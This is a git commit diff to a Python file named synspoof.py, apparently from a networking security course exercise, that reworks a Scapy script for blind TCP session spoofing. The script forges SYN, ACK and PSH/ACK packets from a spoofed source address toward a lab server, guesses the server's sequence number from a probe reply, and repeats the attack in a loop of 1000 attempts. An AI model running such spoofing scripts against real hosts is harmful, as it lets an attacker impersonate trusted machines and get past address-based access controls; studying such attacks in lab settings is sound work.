d5069885092f756f7081e22f67c5119f4383e820
trevor <trevor>
2023-04-09 20:27:27 +0000

    13337_tcp_udp

--- week4/synspoof.py
+++ week4/synspoof.py
@@ -7,25 +7,19 @@ _server="172.16.44.1"
 _attacker_ip = get_if_addr('tap0')
 _spoof_ip="10.2.4.10"
 
-
-SYN_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags='S',seq=0)
-SYN_attacker = IP(src=_attacker_ip, dst=_server)/TCP(dport=_port,flags='S',seq=0)
-ans=sr1(SYN_attacker)
-if str(ans[TCP].seq).startswith('8454'): #if SYN-ACK has 8454, then there's a chance it will repeat within 100 packets
-    send(SYN_spoof,count=100)
+def do_spoof():
+    SYN_spoof = IP(src=_spoof_ip, dst=_server)/TCP(sport=_port, dport=_port,flags='S',seq=0)
+    SYN_attacker = IP(src=_attacker_ip, dst=_server)/TCP(sport=_port, dport=_port,flags='S',seq=0)
+    ans=sr1(SYN_attacker)
+    # if str(ans[TCP].seq).startswith('8454'): #if SYN-ACK has 8454, then there's a chance it will repeat within 10 packets
+    send(SYN_spoof,count=10)
     ack = ans[TCP].seq + 1   #the guessed SYN-ACK seq + 1 
-    ACK_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags='A',ack= ack, seq=1)
+    ACK_spoof = IP(src=_spoof_ip, dst=_server)/TCP(sport=_port, dport=_port,flags='A',ack= ack, seq=1)
     send(ACK_spoof,count=1)
     #Flags: 0x018 (PSH, ACK)
-    PSH_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=1)/_attacker_ip
+    PSH_spoof = IP(src=_spoof_ip, dst=_server)/TCP(sport=_port, dport=_port,flags=0x0018, ack=ack, seq=1)/_attacker_ip
+    send(PSH_spoof,count=1)
 
-send(P,count=1)
-seq=seq + len(_spoof_ip)
 
-P = IP(dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=seq)/_spoof_ip
-send(P,count=1)
-seq=seq + len(_spoof_ip)
-
-P = IP(dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=seq)/_spoof_ip
-send(P,count=1)
-seq=seq + len(_spoof_ip)
+for i in range(0,1000):
+    do_spoof()
